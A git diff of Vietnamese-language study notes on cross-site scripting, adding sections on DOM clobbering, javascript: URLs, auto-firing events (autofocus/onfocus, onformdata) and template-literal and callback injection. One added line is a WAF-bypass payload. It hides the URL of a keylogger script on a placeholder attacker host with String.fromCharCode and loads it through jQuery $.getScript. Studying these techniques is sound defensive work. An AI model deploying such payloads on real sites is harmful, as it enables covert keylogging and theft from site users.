@@ -258,7 +258,7 @@ Các lý thuyết trên không thể overwrite các biến đã được khai b�
 </body>
 </html>
 ```
-
+##### tạo phân cấp
 Trong html có tính chất kế thừa trong thẻ `form`. Từ đây có thể tạo phân cấp
 ```html
 <!DOCTYPE html>
@@ -315,6 +315,8 @@ ngoài `window` thì `document` cũng sẽ ảnh hưởng
 </body>
 </html>
 ```
+
+Trong cùng 1 thẻ html cũng có thể sử dụng cả `id` và `name` để tạo phân cấp. Một case đặc biệt là thẻ `a` và `area` sẽ trả về giá trị của `herf`
 
 #### MIME Sniffing
 Nếu response không set `Content-Type` thì chúng ta có thể controll content để trình duyệt xử lý nó như `html/text` bằng cách sử dụng ` MIME sniffing `.
@@ -394,3 +396,52 @@ Các sự kiện này không nhất thiết xảy ra sau khi toàn bộ trang t�
 | `div` | `onanimationstart`, `onanimationend` |
 
 
+## XSS hacktrick
+### reference
+https://hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/index.html
+
+### inside tag attribute and javascript context
+Bên trong javascript context thì các kí tự encode sẽ được tự động decode rồi mới thực thi
+
+Trong attribute `herf` có thể thực thi mã js nếu sử dụng `javascript:` protocol , bên trong này nó sẽ tự động `decode_html` hay `decode_url` rồi mới thực thi.
+
+Tự động focus vào thẻ `a` tương đương với việc click vào link thì sử dụng `autofocus` `onfocus`: 
+```html
+<a href="https://example.com"
+   autofocus
+   onfocus="alert(1)">
+   Click me
+</a>
+```
+
+Tự động submit form: `onformdata` là event handler được kích hoạt khi trình duyệt xây dựng danh sách dữ liệu của form.Được kích hoạt khi 
+- Người dùng submit form.
+- JavaScript gọi `form.submit()`.
+- JavaScript gọi `form.requestSubmit()`.
+- JavaScript khởi tạo `new FormData(form)`.
+```html
+<form id="myForm"
+      onsubmit="console.log('onsubmit')"
+      onformdata="console.log('onformdata')">
+
+    <input name="username" value="alice">
+
+</form>
+
+<script>
+    document.getElementById("myForm").submit();
+</script>
+```
+Tự động gửi form mà không cần user click.
+
+nếu target sử dụng các thư viện như ở phía FE thì có thể tận dụng nó để trigger XSS hay bypass WAF. Ví dụ đối với thư viện jQuery.
+```
+onfocus="(history.length);const url=String.fromCharCode(104,116,116,112,115,58,47,47,97,116,116,97,99,107,101,114,46,116,108,100,47,107,101,121,108,111,103,103,101,114,46,106,115);$.getScript(url),function(){}"
+```
+### Inside JavaScript code
+Trong js nếu sử dụng literals thì có thể thực thi mã js trong nó bằng cách sử dụng `${ mã js }`.
+
+Một số trang web chấp nhận tham số của một function rồi thực thi. Ví dụ phổ biến nhất là `?callback=callbackFunc.`
+
+### Dom Clobbering
+Nhận biết: `var someObject = window.someObject || {}`
